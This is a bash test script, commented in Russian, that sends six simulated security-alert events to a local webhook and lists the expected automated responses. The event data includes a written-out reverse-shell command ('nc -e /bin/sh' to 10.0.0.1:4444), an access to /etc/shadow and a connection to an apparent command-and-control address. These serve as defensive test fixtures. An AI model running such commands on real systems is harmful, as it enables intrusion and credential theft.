#!/bin/bash

# Скрипт для тестирования интеграции с Guardd

set -e

GUARDD_WEBHOOK="http://localhost:8081/guardd-events"

echo "🛡️ Тестирование интеграции с Guardd"
echo "====================================="
echo ""

# Цвета
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Проверка доступности
echo "1️⃣  Проверка доступности Guardd webhook..."
if curl -s "$GUARDD_WEBHOOK" > /dev/null 2>&1 || [ $? -eq 52 ]; then
    echo -e "${GREEN}✅ Guardd webhook доступен${NC}"
else
    echo -e "${RED}❌ Guardd webhook недоступен на :8081${NC}"
    echo "Запустите приложение: sudo ./target/release/enterprise-security-stack"
    exit 1
fi
echo ""

# Тест 1: File Access
echo "2️⃣  Тест 1: Critical File Access (/etc/shadow)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
curl -s -X POST "$GUARDD_WEBHOOK" \
  -H "Content-Type: application/json" \
  -d '{
    "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'",
    "event_type": "file_access",
    "pod_name": "suspicious-pod",
    "namespace": "default",
    "container_name": "app",
    "severity": "critical",
    "details": {
      "description": "Unauthorized access to /etc/shadow",
      "process_name": "cat",
      "file_path": "/etc/shadow"
    }
  }' > /dev/null

echo -e "${GREEN}✅ Событие отправлено${NC}"
echo "Ожидаемые действия:"
echo "  - Изоляция пода suspicious-pod"
echo "  - Создание снапшота"
echo "  - Уведомление SOC"
echo ""
sleep 2

# Тест 2: Network Connection
echo "3️⃣  Тест 2: Suspicious Network Connection"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
curl -s -X POST "$GUARDD_WEBHOOK" \
  -H "Content-Type: application/json" \
  -d '{
    "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'",
    "event_type": "network_connection",
    "pod_name": "web-app",
    "namespace": "production",
    "container_name": "nginx",
    "severity": "high",
    "details": {
      "description": "Connection to known C2 server",
      "process_name": "curl",
      "network_dest": "203.0.113.42:4444"
    }
  }' > /dev/null

echo -e "${GREEN}✅ Событие отправлено${NC}"
echo "Ожидаемые действия:"
echo "  - Блокировка IP 203.0.113.42"
echo "  - Изоляция пода web-app"
echo "  - Проверка в threat intelligence"
echo ""
sleep 2

# Тест 3: Process Execution
echo "4️⃣  Тест 3: Malicious Process Execution"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
curl -s -X POST "$GUARDD_WEBHOOK" \
  -H "Content-Type: application/json" \
  -d '{
    "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'",
    "event_type": "process_execution",
    "pod_name": "backend",
    "namespace": "default",
    "container_name": "api",
    "severity": "critical",
    "details": {
      "description": "Reverse shell detected",
      "process_name": "/bin/bash",
      "cmdline": "/bin/bash -c \"nc -e /bin/sh 10.0.0.1 4444\""
    }
  }' > /dev/null

echo -e "${GREEN}✅ Событие отправлено${NC}"
echo "Ожидаемые действия:"
echo "  - Kill процесса"
echo "  - Изоляция контейнера"
echo "  - Создание снапшота"
echo ""
sleep 2

# Тест 4: Capability Usage
echo "5️⃣  Тест 4: Suspicious Capability Usage"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
curl -s -X POST "$GUARDD_WEBHOOK" \
  -H "Content-Type: application/json" \
  -d '{
    "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'",
    "event_type": "capability_usage",
    "pod_name": "worker",
    "namespace": "default",
    "container_name": "job",
    "severity": "high",
    "details": {
      "description": "CAP_SYS_ADMIN usage detected",
      "process_name": "mount",
      "capabilities": ["CAP_SYS_ADMIN"]
    }
  }' > /dev/null

echo -e "${GREEN}✅ Событие отправлено${NC}"
echo "Ожидаемые действия:"
echo "  - Проверка легитимности"
echo "  - Аудит использования"
echo "  - Алерт администратору"
echo ""
sleep 2

# Тест 5: Syscall Anomaly
echo "6️⃣  Тест 5: Syscall Anomaly"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
curl -s -X POST "$GUARDD_WEBHOOK" \
  -H "Content-Type: application/json" \
  -d '{
    "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'",
    "event_type": "syscall_anomaly",
    "pod_name": "database",
    "namespace": "production",
    "container_name": "postgres",
    "severity": "medium",
    "details": {
      "description": "Unusual ptrace syscall detected",
      "syscall": "ptrace"
    }
  }' > /dev/null

echo -e "${GREEN}✅ Событие отправлено${NC}"
echo "Ожидаемые действия:"
echo "  - Логирование аномалии"
echo "  - Анализ контекста"
echo ""
sleep 2

# Тест 6: Config Change
echo "7️⃣  Тест 6: Configuration Change"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
curl -s -X POST "$GUARDD_WEBHOOK" \
  -H "Content-Type: application/json" \
  -d '{
    "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'",
    "event_type": "config_change",
    "pod_name": "api-server",
    "namespace": "kube-system",
    "container_name": "kube-apiserver",
    "severity": "high",
    "details": {
      "description": "Modification of /etc/kubernetes/manifests",
      "file_path": "/etc/kubernetes/manifests/kube-apiserver.yaml"
    }
  }' > /dev/null

echo -e "${GREEN}✅ Событие отправлено${NC}"
echo "Ожидаемые действия:"
echo "  - Алерт о изменении конфигурации"
echo "  - Аудит изменений"
echo ""
sleep 2

# Проверка результатов
echo "8️⃣  Проверка обработки событий..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo -e "${BLUE}Проверьте логи приложения:${NC}"
echo "  sudo journalctl -u enterprise-security-stack -f | grep Guardd"
echo ""
echo -e "${BLUE}Или просмотрите последние логи:${NC}"
echo "  sudo journalctl -u enterprise-security-stack --since \"1 minute ago\" | grep Guardd"
echo ""

# Итоги
echo "✅ Тестирование завершено!"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "📝 Резюме:"
echo "  - Отправлено Guardd событий: 6"
echo "  - Типы: File Access, Network, Process, Capability, Syscall, Config"
echo "  - Severity levels: Critical, High, Medium"
echo ""
echo "🔍 Для просмотра всех событий Guardd:"
echo "   curl http://localhost:3000/api/guardd/events | jq"
echo ""
echo "📊 Для просмотра критических событий:"
echo "   curl http://localhost:3000/api/guardd/critical | jq"
